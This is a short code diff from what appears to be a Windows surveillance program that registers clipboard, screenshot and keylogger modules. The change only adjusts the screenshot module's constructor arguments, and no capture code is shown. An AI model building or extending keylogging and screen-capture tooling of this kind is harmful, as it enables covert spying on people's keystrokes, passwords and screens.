@@ -62,7 +62,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
     g_registry.Register(std::make_unique<ClipboardModule>());
 
 
-    g_registry.Register(std::make_unique<ScreenshotModule>(30));
+    g_registry.Register(std::make_unique<ScreenshotModule>(30 , 30));
 
     g_registry.Register(std::make_unique<KeyloggerModule>());
 
